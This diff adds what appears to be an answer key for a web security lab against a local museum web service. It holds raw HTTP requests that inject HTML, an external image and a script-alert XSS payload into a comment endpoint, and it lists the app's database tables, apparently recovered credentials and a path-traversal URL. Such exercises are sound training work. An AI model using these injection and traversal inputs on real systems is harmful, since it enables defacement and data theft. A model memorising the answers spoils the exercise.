@@ -1,0 +1,54 @@
+# Network User
+
+**N01:** 
+
+**N02:** 
+    POST http://localhost:8188/MuseumService.svc/comment?name=HTML%20Injection HTTP/1.1
+    Host: localhost:8188
+    Content-Type: application/json; charset=utf-8
+    Origin: http://localhost:8188
+    Content-Length: 43
+
+
+    "<style>*{background-color:green}</style>"
+
+**N03:** 
+    POST http://localhost:8188/MuseumService.svc/comment?name=Image%20Injection HTTP/1.1
+    Host: localhost:8188
+    Content-Type: application/json; charset=utf-8
+    Origin: http://localhost:8188
+    Content-Length: 73
+
+
+    "<img src=\"http://www.placekitten.com/1000/1000\" alt=\"kittens!\">"
+
+**N04:** 
+    POST http://localhost:8188/MuseumService.svc/comment?name=XSS HTTP/1.1
+    Host: localhost:8188
+    Content-Type: application/json; charset=utf-8
+    Origin: http://localhost:8188
+    Content-Length: 34
+
+
+    "<script>alert(\"evil\")</script>"
+
+**N05:** 
+
+**N06:** 
+
+# Co-Located User
+
+**C01:** 
+    SQLite
+
+**C02:** 
+    There are 4 tables: Comments, Credentials, Items and ShopItems
+
+**C03:** 
+    floria
+
+**C04:** 
+    necessity
+
+**C05:** 
+    http://localhost:8188/MuseumService.svc/itemimg?id=../ImagesBig/Soyache.jpg
